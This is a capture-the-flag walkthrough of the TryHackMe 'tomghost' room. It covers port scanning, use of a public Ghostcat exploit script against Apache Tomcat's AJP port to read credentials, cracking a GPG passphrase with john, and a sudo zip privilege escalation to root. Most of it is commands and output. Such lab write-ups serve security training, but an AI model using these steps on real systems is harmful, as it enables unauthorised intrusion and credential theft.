---
title: Walkthrough - tomghost
published: true
---

Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.

[https://tryhackme.com/room/tomghost](https://tryhackme.com/room/tomghost)

* * *

## Path to Machine

- ``nmap -T4 -p- 10.10.124.33 -vvv``

```shell
22/tcp   open  ssh
53/tcp   open  tcpwrapped syn-ack ttl 61
8080/tcp open  http       syn-ack ttl 61 Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
```

- Port 8080 has an apache tomcat container
- ``gobuster dir -u http://10.10.124.33:8080/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100 -x txt,php,html --no-error``
- ``locate 49716``
- lets check out the pdf and learn about the exploit

## Ghostcat Exploitation

- ``wget https://raw.githubusercontent.com/00theway/Ghostcat-CNVD-2020-10487/master/ajpShooter.py``
- this will read the XML file containing a users's ssh key
- ``python3 ajpShooter.py http://10.10.35.112:8080 8009 /WEB-INF/web.xml read``

![0xskar](/assets/tomghost01.png)

- skyfuck:8730281lkjlkjdqlksalks

- ``scp skyfuck@10.10.35.112:/home/skyfuck/* .`` to get the gpg file so we can use gpg2john to create a hash from the asc file.
- ``john --wordlist=/usr/share/seclists/Passwords/rockyou.txt hash`` = ``alexandru        (tryhackme)``

Now that we have the passphrase to decrtypt the gpg file, we can import the gpg key and then decrypt it.

```shell
┌──(0xskar㉿cocokali)-[~/Documents/TryHackMe/tomghost]
└─$ gpg --import ./tryhackme.asc                                                     
gpg: key 8F3DA3DEC6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

and then...

```shell
┌──(0xskar㉿cocokali)-[~/Documents/TryHackMe/tomghost]
└─$ gpg --decrypt credential.pgp 
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j  
```

Now we have the second user name and user credentials so we can ssh to login and then escalate to become root.


```shell
merlin@ubuntu:/tmp$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

So we can run this to get root:

```shell
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

* * * 

## User.txt

- ``cat /home/merlin/user.txt``

* * * 

## Root.txt

- ``cat /root/root.txt``

* * * 